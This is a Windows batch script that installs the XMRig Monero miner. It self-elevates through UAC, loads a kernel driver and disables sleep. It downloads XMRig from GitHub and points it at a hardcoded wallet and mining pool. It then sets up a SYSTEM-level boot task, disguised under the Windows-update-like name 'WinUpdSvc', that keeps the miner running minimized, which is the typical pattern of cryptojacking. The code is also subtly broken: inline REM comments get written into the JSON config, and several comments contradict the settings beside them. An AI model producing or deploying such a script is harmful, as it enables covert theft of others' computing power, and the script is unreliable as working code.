@echo off
REM ====================================================================
REM Ultimate Monero Miner - Mid-End PC Edition
REM ====================================================================
setlocal enableextensions enabledelayedexpansion

REM === CONFIGURATION ===
set "SRC=%~dp0miner_src"
set "DEST=C:\xmrig_miner"
set "TASK_NAME=WinUpdSvc"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "POOL=gulf.moneroocean.stream:10032"
set "LOG_FILE=%DEST%\miner.log"
set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"

REM === One-Time Admin Enforcement ===
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)

echo ===============================
echo Starting Monero Miner on Mid-End PC
echo ===============================

REM === Clean Up Existing Task (If Any) ===
echo [*] Cleaning up existing scheduled task (if any)...
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

REM === MSR Driver Installation (With Fallback) ===
echo [*] Attempting to install MSR driver for performance boost...
if exist "%SRC%\winring0x64.sys" (
    sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand >nul 2>&1
    sc start WinRing0_1_2_0 >nul 2>&1
    if '%errorlevel%' neq '0' (
        echo [!] Failed to install MSR driver. Continuing without it...
    )
) else (
    echo [!] WinRing0x64.sys not found. Continuing without MSR tweaks...
)

REM === System Optimization ===
powercfg /change standby-timeout-ac 0 >nul
powercfg /change standby-timeout-dc 0 >nul
powercfg /hibernate off >nul
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESS IDLE_DISABLE 000 >nul
powercfg /setactive SCHEME_CURRENT >nul

REM === CPU Core Detection ===
set "AFFINITY_MASK="
for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "="') do (
    set /a "CORES=%%A"
    set /a "AFFINITY_MASK=(1<<%%A)-1"
)
if not defined AFFINITY_MASK (
    set "AFFINITY_MASK=15"  REM Fallback for 4 cores
)

REM === Auto-Update Miner ===
echo [*] Checking for XMRig updates...
set "URL="
for /f "delims=" %%A in ('powershell -NoProfile -Command ^
  "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"

if defined URL (
    echo [+] Downloading update...
    powershell -Command "try{IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}catch{exit 1}" && (
        if not exist "%SRC%" mkdir "%SRC%"
        powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force"
        del "%TEMP%\xmrig.zip"
    )
)

REM === Install Files ===
if not exist "%DEST%" mkdir "%DEST%"
xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul || (
    echo [!] File copy failed
    pause
    exit /b 1
)

REM === Generate Config File ===
(
  echo {
  echo   "autosave": true,
  echo   "cpu": {
  echo     "enabled": true,
  echo     "huge-pages": true,  REM Disabled for stability on mid-end PC
  echo     "hw-aes": true,
  echo     "priority": 2,  REM Normal priority to avoid system strain
  echo     "memory-pool": true,
  echo     "asm": true,
  echo     "max-threads-hint": 75,  REM Reduced to 50% CPU usage
  echo     "affinity": !AFFINITY_MASK!
  echo   },
  echo   "opencl": false,
  echo   "cuda": false,
  echo   "pools": [
  echo     {
  echo       "url": "%POOL%",
  echo       "user": "%WALLET%",
  echo       "pass": "%COMPUTERNAME%",
  echo       "keepalive": true,
  echo       "tls": false
  echo     }
  echo   ]
  echo }
) > "%DEST%\config.json"

REM === Clean Watchdog ===
(
  echo @echo off
  echo :loop
  echo "%DEST%\xmrig.exe" --config="%DEST%\config.json" ^
       --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
  echo timeout /t 10 >nul
  echo tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /i "xmrig.exe" >nul ^|^| goto loop
  echo goto loop
) > "%DEST%\run_watchdog.bat"

REM === Permanent Auto-Start ===
echo [*] Creating scheduled task to run on boot...
schtasks /create /tn "%TASK_NAME%" ^
  /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
  /sc onstart ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f >nul 2>&1 || (
    echo [!] Failed to create scheduled task. Please ensure you are running as administrator.
    pause
    exit /b 1
)

REM === Verify Scheduled Task ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if '%errorlevel%' equ '0' (
    echo [✔] Scheduled task created successfully.
) else (
    echo [!] Scheduled task creation failed or task not found.
    pause
    exit /b 1
)

start "" /min "%DEST%\run_watchdog.bat"

echo [✔] Miner installed (optimized for mid-end PC)
echo CPU Affinity: !AFFINITY_MASK!
echo Logs: %LOG_FILE%
echo Uninstall: schtasks /delete /tn "%TASK_NAME%" /f ^>nul ^&^& rmdir /s /q "%DEST%"
pause